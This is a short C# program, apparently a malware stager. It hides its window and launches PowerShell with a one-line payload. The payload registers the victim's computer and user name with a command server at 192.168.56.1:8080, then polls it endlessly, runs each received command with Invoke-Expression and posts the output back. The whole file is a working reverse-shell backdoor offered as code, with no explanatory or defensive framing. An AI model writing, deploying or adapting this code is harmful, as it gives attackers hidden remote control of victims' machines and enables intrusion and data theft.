using System;
using System.Diagnostics;

class Program
{
    static void Main(string[] args)
    {
        System.Diagnostics.Process process = new System.Diagnostics.Process();
        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
        startInfo.FileName = "powershell.exe";
        startInfo.Arguments = "/c Start-Process $PSHOME\\powershell.exe -WindowStyle Hidden -ArgumentList {Set-Variable -Name s -Value ('192.168.56.1:8080');Set-Variable -Name i -Value ('0e288476-894b631c-e95960fb');Set-Variable -Name p -Value ('http://');Set-Variable -Name v -Value (Invoke-RestMethod -Headers @{\"Authorization\"=$i;} -UseBasicParsing -Uri $p$s/0e288476/$env:COMPUTERNAME/$env:USERNAME);for (;;){Set-Variable -Name c -Value (Invoke-RestMethod -Uri $p$s/894b631c -Headers @{\"Authorization\"=$i;} -UseBasicParsing);if ($c -ne 'None') {$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/e95960fb -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}}";
        process.StartInfo = startInfo;
        process.Start();
    }

}
